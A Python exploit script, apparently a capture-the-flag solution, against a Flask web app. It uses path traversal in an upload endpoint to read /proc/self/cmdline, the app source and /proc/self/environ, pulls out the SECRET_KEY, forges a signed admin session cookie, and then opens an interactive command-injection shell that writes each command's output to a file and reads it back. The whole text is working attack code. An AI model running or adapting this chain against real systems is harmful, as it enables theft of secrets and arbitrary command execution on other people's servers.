target = 'http://localhost:5000'
# target = 'http://61.147.171.105:62919'

import time
import requests
import re
from base64 import b64decode

def get_content() -> str:
    s = requests.Session()
    r = s.post(target + '/login',data="username=123213&password=123456",headers={'Content-Type': 'application/x-www-form-urlencoded'})
    r = s.get(target + '/upload?file_path=../../../../proc/self/cmdline').text
    base64 = re.findall(r'<img src="data:image/png;base64,(.*)" alt="Uploaded Image">',r)[0]
    base64 = b64decode(base64).decode()
    file_path = base64.split('python')[-1]
    print(file_path)
    r = s.get(target + '/upload?file_path=../../../../app/app.py').text
    base64 = re.findall(r'<img src="data:image/png;base64,(.*)" alt="Uploaded Image">',r)[0]
    base64 = b64decode(base64).decode()
    return base64

def get_key() -> str:
    s = requests.Session()
    r = s.post(target + '/login',data="username=123456&password=123456",headers={'Content-Type': 'application/x-www-form-urlencoded'})
    r = s.get(target + '/upload?file_path=../../../../proc/self/environ').text
    # print(r)
    base64 = re.findall(r'<img src="data:image/png;base64,(.*)" alt="Uploaded Image">',r)[0]
    base64 = b64decode(base64).decode()
    secret_key = re.findall("SECRET_KEY=(.*)\x00HOME=/root",base64)[0]
    return secret_key

def rce(signed_session):
    # session = {'session':signed_session}
    # signed_session = "eyJ1ZXNybmFtZSI6ImFkbWluIn0.aAmhPg.7VqzUh4j_AcW7w8qszkyKKI7CZE"
    s = requests.Session()
    s.post(target + '/login',data="username=123456&password=123456",headers={'Content-Type': 'application/x-www-form-urlencoded'})
    admin = requests.Session()
    admin.post(target + '/login',data="username=admin&password=backdoor",headers={'Content-Type': 'application/x-www-form-urlencoded'})
    while 1:
        cmd = input('>>>')
        payload = f';{cmd} > ./uploads/output;'
        # r = requests.get(target + f'/upload?file_path={payload}',headers={'Cookie':f'session={signed_session}'})
        r = admin.get(target + f'/upload?file_path={payload}',headers={'Cookie':f'session={signed_session}'})
        print(r.text)
        r = s.get(target + '/upload?file_path=output').text
        base64 = re.findall(r'<img src="data:image/png;base64,(.*)" alt="Uploaded Image">',r)[0]
        output = b64decode(base64).decode()
        print(output)
    
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

def sign_session(secret_key, session_data):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(
        secret_key,
        salt=salt,
        serializer=serializer,
        signer_kwargs=signer_kwargs
    )
    return s.dumps(session_data)

file_content = get_content()
secret_key = get_key()
print(secret_key)

session = {'username':'admin'}

signed_session = sign_session(secret_key,session)
print(signed_session)
rce(signed_session)